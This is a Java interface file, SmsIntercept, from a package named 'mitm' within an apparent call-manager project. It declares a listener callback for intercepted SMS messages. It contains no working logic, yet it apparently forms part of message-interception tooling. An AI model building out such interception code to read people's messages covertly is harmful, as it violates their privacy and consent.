package com.vvt.callmanager.mitm;

import com.vvt.callmanager.ref.SmsInterceptInfo;
import com.vvt.callmanager.std.SmsInfo;

public interface SmsIntercept {

	public void setInterceptListener(Listener listener);
	public void resetInterceptListener();
	
	public interface Listener {
		public void onSmsIntercept(SmsInterceptInfo interceptInfo, SmsInfo smsInfo);
	}
}
